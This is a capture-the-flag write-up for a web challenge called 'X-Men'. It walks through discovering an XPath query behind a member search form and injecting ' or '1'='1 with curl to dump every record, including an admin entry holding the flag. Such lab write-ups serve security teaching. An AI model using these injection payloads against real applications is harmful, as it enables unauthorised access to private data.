
# X-Men

 * Category: Web
 * Solved by the JCTF Team

## Description

> Welcome to Xavier's School for Gifted Youngsters! The X-Men Academy has launched a new member portal where students can search for other academy members.
> Storm has reported suspicious behavior with the search functionality, and Professor Xavier suspects there might be security vulnerabilities.
> Your mission: Find a way to access information that shouldn't be publicly available. Some academy members have special privileges and access to classified data.
> 
> Can you uncover the academy's secrets?

## Solution

The attached website contained a form to search for members according to their username:

```html
<form method="POST" class="mb-3">
    <div class="input-group">
        <input type="text" class="form-control" name="search" placeholder="Search members by username..." value="">
        <button type="submit" class="btn btn-primary">Search XML Database</button>
    </div>
</form>
<table class="table table-striped">
    <thead>
        <tr><th>Username</th><th>Role</th><th>Secret</th></tr>
    </thead>
    <tbody> 
        <tr><td>cyclops</td><td>field_leader</td><td>Leading the X-Men is tough!</td></tr>
        <tr><td>storm</td><td>weather_controller</td><td>I command the skies!</td></tr>
        <tr><td>wolverine</td><td>berserker</td><td>Healing factor saves me every time.</td></tr>
        <tr><td>jean</td><td>telepath</td><td>The Phoenix is within me.</td></tr>
    </tbody>
</table>
```

Searching for "admin" returns "Not Authorized".

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/xmen]
└─$ curl 'https://x-men.appsecil.ctf.today/profile' \
  -X POST -s -L \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ.aD3K3A.W0E6jc88uokOguEp6Snm2luJp28' \
  --data-raw 'search=admin' | grep alert
                            <div class="alert alert-danger">Not Authorized</div>
```

From the form submit button, we know the database is stored in XML. 
We can also search for special characters to try and trigger an error:

```
┌──(user@kali3)-[/media/sf_CTFs/appsec/xmen]
└─$ curl 'https://x-men.appsecil.ctf.today/profile' \
  -X POST -s -L \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ.aD3K3A.W0E6jc88uokOguEp6Snm2luJp28' \
  --data-raw "search=%27" | grep alert
                            <div class="alert alert-danger">XPath query failed: Invalid predicate</div>
```

Indeed, we can see that XPath is used under the hood. It's likely the backend is doing something like:

```
//user[name/text()='QUERY']
```

If the input is directly inserted into this XPath query without proper escaping, 
we can manipulate the structure. We can try using a query such as `' or '1'='1`, which will
turn the full query to:

```
//user[name/text()='' or '1'='1']
```

This should return all users. Let's try it:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/xmen]
└─$ curl 'https://x-men.appsecil.ctf.today/profile' \
  -X POST -s -L \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ.aD3K3A.W0E6jc88uokOguEp6Snm2luJp28' \
  --data-raw "search=%27+or+%271%27%3D%271" | grep td
                                        <td>cyclops</td>
                                        <td>field_leader</td>
                                        <td>Leading the X-Men is tough!</td>
                                        <td>storm</td>
                                        <td>weather_controller</td>
                                        <td>I command the skies!</td>
                                        <td>wolverine</td>
                                        <td>berserker</td>
                                        <td>Healing factor saves me every time.</td>
                                        <td>jean</td>
                                        <td>telepath</td>
                                        <td>The Phoenix is within me.</td>
                                        <td>admin</td>
                                        <td>administrator</td>
                                        <td>AppSec-IL{!XPaTh_Inj3ct10n@_F0rC3}</td>
```

The flag: `AppSec-IL{!XPaTh_Inj3ct10n@_F0rC3}`